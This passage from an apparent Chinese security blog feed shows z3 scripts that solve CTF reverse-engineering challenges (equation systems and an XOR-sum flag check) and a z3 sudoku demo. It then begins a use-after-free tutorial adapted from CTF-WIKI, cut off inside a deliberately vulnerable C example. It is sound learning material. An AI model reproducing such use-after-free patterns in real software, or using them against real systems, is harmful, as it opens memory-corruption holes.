class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(v5 == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(v6 == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(v7 == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(v8 == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(v9 == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(v10 == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(v11 == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(v12 == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(v13 == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(v14 == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(v15 == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(v16 == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(v17 == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(v18 == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(v19 == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(v20 == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(v21 == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(v22 == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(v23 == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(v24 == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(v25 == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(v26 == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(v27 == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(v28 == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(v29 == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(v30 == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(v31 == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(v32 == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80)</span><br><span class="line">s.add(v33 == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(v34 == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(v35 == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(v36 == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(v37 == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(v38 == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(v39 == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(v40 == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(v41 == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(v42 == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(v43 == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(v44 == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(v45 == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line">print(s.check())</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">m = s.model()</span><br><span class="line">print(m)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    print(<span class="string">&quot;%s = %s&quot;</span> % (d.name(), m[d]))</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-REConvolution"><a href="#极客大挑战-REConvolution" class="headerlink" title="极客大挑战 REConvolution"></a>极客大挑战 REConvolution</h3><blockquote><p>这条题目演示用批量申请堆方法</p></blockquote><p>题目关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ii; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> flag_i; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> jj; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> xor_result[<span class="number">80</span>]; <span class="comment">// [esp+8h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+58h] [ebp-54h]</span></span><br><span class="line">  sub_DC1020(<span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">  sub_DC1050(<span class="string">&quot;%40s&quot;</span>, flag);</span><br><span class="line">  <span class="built_in">memset</span>(xor_result, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  ii = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag_i = flag[ii];</span><br><span class="line">      jj = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;xor_result[jj + ii];</span><br><span class="line">        v8 = flag_i ^ data1[jj++];</span><br><span class="line">        *v7 += v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( jj &lt; <span class="number">0x20</span> );</span><br><span class="line">      ++ii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( ii &lt; v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(xor_result, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;data2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No, it isn&#x27;t.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Yes, it is.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密过程并不是前两题的方程了，而是循环异或，没有修改方程变量名的问题，所以我们可以用 for 循环申请变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">X =  [BitVec((<span class="string">&#x27;x%s&#x27;</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>) ]</span><br><span class="line">data1 =  [<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2A</span>,<span class="number">0x2B</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x2F</span>,<span class="number">0x3A</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x3C</span>,<span class="number">0x3D</span>,<span class="number">0x3E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x5B</span>,<span class="number">0x5C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x5F</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x7C</span>,<span class="number">0x7D</span>,<span class="number">0x7E</span>]</span><br><span class="line">data2 = [<span class="number">0x72</span>,<span class="number">0xE9</span>,<span class="number">0x4D</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xD0</span>,<span class="number">0x24</span>,<span class="number">0x6B</span>,<span class="number">0xB2</span>,<span class="number">0xF5</span>,<span class="number">0xFD</span>,<span class="number">0x45</span>,<span class="number">0x49</span>,<span class="number">0x94</span>,<span class="number">0xDC</span>,<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x6B</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0x5C</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0xE4</span>,<span class="number">0x67</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xA1</span>,<span class="number">0xC7</span>,<span class="number">0x04</span>,<span class="number">0x2B</span>,<span class="number">0xC2</span>,</span><br><span class="line"><span class="number">0x9D</span>,<span class="number">0x3F</span>,<span class="number">0xA7</span>,<span class="number">0x6C</span>,<span class="number">0xE7</span>,<span class="number">0xD0</span>,<span class="number">0x90</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0xB3</span>,<span class="number">0xAB</span>,<span class="number">0x67</span>,<span class="number">0xBF</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x6D</span>,<span class="number">0x35</span>,<span class="number">0xC8</span>,<span class="number">0x55</span>,<span class="number">0xFF</span>,<span class="number">0xC0</span>,<span class="number">0x95</span>,<span class="number">0x62</span>,<span class="number">0xE6</span>,<span class="number">0xBB</span>,<span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x29</span>,<span class="number">0x0E</span>,<span class="number">3</span>]</span><br><span class="line">xor_result = [<span class="number">0</span>]*<span class="number">0x41</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        xor_result[n+m] += X[m] ^ data1[n]</span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x41</span>):</span><br><span class="line">    s.add(xor_result[o] == data2[o])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[X[i]]))),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;failed to solve&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="数独"><a href="#数独" class="headerlink" title="数独"></a>数独</h3><p>z3 还能处理数独问题，下面是官方 demo ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 9x9整数变量矩阵</span></span><br><span class="line">X = [ [ Int(<span class="string">&quot;x_%s_%s&quot;</span> % (i+<span class="number">1</span>, j+<span class="number">1</span>)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个单元格包含&#123;1，…，9&#125;中的值</span></span><br><span class="line">cells_c  = [ And(<span class="number">1</span> &lt;= X[i][j], X[i][j] &lt;= <span class="number">9</span>)</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每行最多包含一个数字一次</span></span><br><span class="line">rows_c   = [ Distinct(X[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每列最多包含一个数字</span></span><br><span class="line">cols_c   = [ Distinct([ X[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ])</span><br><span class="line">             <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个3x3正方形最多包含一个数字</span></span><br><span class="line">sq_c     = [ Distinct([ X[<span class="number">3</span>*i0 + i][<span class="number">3</span>*j0 + j]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) ])</span><br><span class="line">             <span class="keyword">for</span> i0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> j0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) ]</span><br><span class="line"></span><br><span class="line">sudoku_c = cells_c + rows_c + cols_c + sq_c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数独实例，我们用&#x27;0&#x27;表示空单元格</span></span><br><span class="line">instance = ((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">8</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),</span><br><span class="line">            (<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">instance_c = [ If(instance[i][j] == <span class="number">0</span>,</span><br><span class="line">                  <span class="literal">True</span>,</span><br><span class="line">                  X[i][j] == instance[i][j])</span><br><span class="line">               <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(sudoku_c + instance_c)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    r = [ [ m.evaluate(X[i][j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line">          <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>) ]</span><br><span class="line">    print_matrix(r)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;failed to solve&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/qq_33438733/article/details/82011892">Z3 学习笔记</a></li><li><a href="http://3xp10it.cc/auxilary/2017/11/14/z3-solver%E5%AD%A6%E4%B9%A0/">z3 solver学习</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Z3 </tag>
            
            <tag> 合天 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF学习笔记</title>
      <link href="archives/dce2ba26/"/>
      <url>archives/dce2ba26/</url>
      
        <content type="html"><![CDATA[<blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><blockquote><p>dangling pointer ： 悬空指针</p><p>wild pointer ：野指针，没有被初始化过的指针</p></blockquote><p>这里给出一个简单的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span 